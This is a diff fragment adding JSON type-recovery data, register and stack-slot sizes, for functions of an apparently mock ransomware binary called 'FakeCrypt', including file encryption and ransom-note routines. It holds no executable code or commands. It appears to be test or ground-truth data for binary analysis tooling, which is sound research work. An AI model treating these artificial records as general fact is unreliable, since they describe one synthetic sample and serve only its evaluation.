+      "stack_104": [
+        [
+          "primitive",
+          null
+        ]
+      ],
+      "stack_296": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "stack_312": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_304": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "reg_r12": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_320": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_r14": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rbx": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_280": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_32": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_16": [
+        [
+          "primitive",
+          null
+        ],
+        [
+          "primitive",
+          4
+        ],
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_256": [
+        [
+          "primitive",
+          null
+        ]
+      ],
+      "stack_56": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_64": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_0": [
+        [
+          "&primitive",
+          8
+        ],
+        [
+          "primitive",
+          4
+        ],
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_8": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_112": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_24": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_72": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "reg_rdx": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "&primitive",
+          8
+        ],
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "reg_ymm0": [
+        [
+          "primitive",
+          null
+        ]
+      ],
+      "stack_97": [
+        [
+          "primitive",
+          null
+        ]
+      ],
+      "stack_81": [
+        [
+          "primitive",
+          null
+        ]
+      ],
+      "stack_264": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN9FakeCrypt7fileops12encrypt_file17ha7bc1626977de376E": {
+      "stack_48": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_8": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "stack_12": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "stack_0": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_24": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_32": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_40": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "reg_rdx": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_96": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "stack_1056": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "stack_100": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_64": [
+        [
+          "&primitive",
+          8
+        ],
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_72": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_7": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "stack_80": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_88": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_104": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_128": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_112": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_120": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN9FakeCrypt7fileops12decrypt_file17h141057e80aed468cE": {
+      "stack_48": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_8": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "stack_12": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "stack_0": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_24": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_32": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_40": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "reg_rdx": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_96": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_1056": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "stack_104": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_112": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_100": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_64": [
+        [
+          "&primitive",
+          8
+        ],
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_72": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_7": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "stack_80": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_88": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_128": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_120": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN9FakeCrypt7fileops17encrypt_directory17hb6c6db8e2661d1b6E": {
+      "stack_8": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "stack_16": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "stack_136": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_184": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_232": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_240": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "stack_96": [
+        [
+          "primitive",
+          null
+        ]
+      ],
+      "stack_128": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_80": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_112": [
+        [
+          "primitive",
+          null
+        ]
+      ],
+      "stack_64": [
+        [
+          "primitive",
+          null
+        ]
+      ],
+      "stack_48": [
+        [
+          "primitive",
+          null
+        ]
+      ],
+      "stack_24": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_32": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_40": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN9FakeCrypt7fileops17decrypt_directory17h7bfbee2fc08c838dE": {
+      "stack_8": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "stack_16": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "stack_136": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_184": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_232": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_240": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "stack_96": [
+        [
+          "primitive",
+          null
+        ]
+      ],
+      "stack_128": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_80": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_112": [
+        [
+          "primitive",
+          null
+        ]
+      ],
+      "stack_64": [
+        [
+          "primitive",
+          null
+        ]
+      ],
+      "stack_48": [
+        [
+          "primitive",
+          null
+        ]
+      ],
+      "stack_24": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_32": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_40": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN9FakeCrypt7fileops16drop_ransom_note17h4942ecd79881b15cE": {
+      "stack_8": [
+        [
+          "primitive",
+          4
+        ],
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "stack_32": [
+        [
+          "primitive",
+          null
+        ]
+      ],
+      "stack_24": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_48": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_64": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "stack_40": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rbp": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_12": [
+        [
+          "primitive",
+          null
+        ]
+      ],
+      "stack_4": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          4
+        ]
+      ]
+    }
+  }
+}
